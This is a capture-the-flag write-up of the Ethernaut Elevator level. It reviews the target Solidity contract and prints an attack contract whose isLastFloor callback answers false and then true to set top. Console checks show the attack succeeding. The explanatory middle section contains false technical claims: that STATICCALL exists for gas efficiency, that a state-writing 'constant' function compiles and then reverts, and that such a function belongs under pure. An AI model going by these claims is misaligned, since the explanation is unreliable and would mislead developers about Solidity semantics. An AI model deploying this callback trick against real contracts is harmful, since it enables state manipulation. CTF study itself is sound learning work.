<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg">


# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
Challenge's message.

>This elevator won't let you reach the top of your building. Right?

This Solidity code represents an elevator contract with a corresponding interface for a building. 

- The elevator contract (**Elevator**) keeps track of the current floor and whether it has reached the top floor.
- The **goTo** function is used to move the elevator to a specified floor.
- The **Building** interface defines a single function **isLastFloor** that takes a floor number as an argument and returns a boolean value indicating whether it is the last floor in the building.

In the **goTo** function, the contract checks if the specified floor is not the last floor by calling the **isLastFloor** function of the **building** instance (which is the contract that called the **goTo** function). If it is not the last floor, the **floor** variable is updated with the new floor number, and the **top** variable is set based on whether the new floor is the last floor. The code is missing some essential details such as the implementation of the **Building** interface and the deployment of the contracts, but this is the basic idea behind this elevator contract.

## Missing State-Modifying Functions

Smart contracts are self-executing programs that automatically enforce the rules and regulations of a contract. One of the main advantages of smart contracts is that they are transparent and immutable, but this also means that once deployed, the code cannot be changed. Therefore, it is important to ensure that the code is secure before deployment.

One potential security pitfall in Solidity is the use of state-modifying functions that are incorrectly labelled as **constant/pure/view** functions. In Solidity versions prior to 0.5.0, it was possible to modify state variables within a constant/pure/view function using assembly code. However, in solc 0.5.0 and later versions, this is no longer possible due to the use of the **STATICCALL** opcode.

The STATICCALL opcode is a **read-only call** that is similar to the CALL opcode, but with the added constraint that **it does not modify the state of the contract**. This opcode was introduced to **improve gas efficiency by allowing the EVM to avoid the overhead of tracking the modifications made by a function**. However, this also means that any state-modifying code that is executed within a function labelled as constant/pure/view will now result in a revert.

For example, consider the following Solidity code:

```solidity
pragma solidity >=0.5.0;

contract MyContract {

  uint256 public myVar;

  function myFunction(uint256 _value) public constant returns (uint256) {
      myVar = _value;
      return myVar;
  }
}
```
This code defines a contract with a public state variable myVar and a state-modifying function myFunction that sets the value of myVar. However, the myFunction function is labelled as constant, which is incorrect because it modifies the state of the contract.

When this contract is compiled with solc 0.5.0 or later, attempting to call the myFunction function will result in a revert because of the use of the STATICCALL opcode. The correct way to label this function would be to remove the constant keyword and label it as **pure** instead, since it does not read or modify the state of the contract.

## Security Practice

There are different ways of missing state-modifying functions that we may come accross in smart contract auditing. What is more, this issue causes a gas increment so you can notify this bug in your report. In this challenge, the **isLastFloor()** function should be marked as `view` for prevent the any dangerous override action.

Let's look at these contract examples to understand better.

```solidity
interface Building {
  function isLastFloor(uint) external returns (bool);
}

// Vulnerable Code
```

```solidity
interface Building {
  function isLastFloor(uint) external view returns (bool);
}

// Safe Code
```

As you can see, it is easy to stay secure. The important point is to check the function's features correspond to the process in the function and not neglect to use gas-safer opcodes. You can get more information about opcodes from [here.](https://ethereum.org/en/developers/docs/evm/opcodes/)

# Subverting

This contract gets an instance from **Building** interface in the **goTo()** function and calls the vulnerable **isLastFloor(uint)** function. The reason for being vulnerable of this function is it just returns a boolean value and **it doesn't change or define anything**. **That's why it allows modification to the function that the attacker wants**. 

Let's continue to explain the vulnerability with our attack contract. Here is our attack contract.

```solidity
pragma solidity ^0.8.17;

interface IElevator {
  function goTo(uint) external;
}

contract Attack{

    bool x = false;

    function attack(address _target)external{
        IElevator target = IElevator(_target);
        target.goTo(1);
    }

    function isLastFloor(uint)external returns(bool){
        if(x){
            return true;
        }
        x = true;
        return false;
    }
}
```

In our attack contract, firstly we defined an interface named **IElavator** which will help us to call **goTo()** function from the target contract. Secondly, we have boolean type of a **x** variable which defined as false when the defination. Next, we have an **attack()** function that takes a target contract's address as an argument. It creates an instance with **IElevator** interface and call the **goTo()** function from this instance. Finally, there is **isLastFloor()** function which will have call from our **goTo()** function to check the last floor. But, when its first check, the function returns false and bypass the `! building.isLastFloor(_floor)` statement. In the second check, it returns true and set top vairable as true. Thus, we will solve the challenge.

In the first step, get new instance from the ethernaut and check the top variable's value.

```js
await contract.top()
false
````

Deploy our attack contract and start to attack. You can get this tx from [here.](https://sepolia.etherscan.io/tx/0x11d571b1449c9fd3c48bf3aedfe8bd0d6eb968ed726ee921de4605ec37e39cb8)

After then, check the top's value again. We solved the elevator challenge.

```js
await contract.top()
true
```

Ethernaut's message:

>You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats. An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().

**_by wasny0ps_**
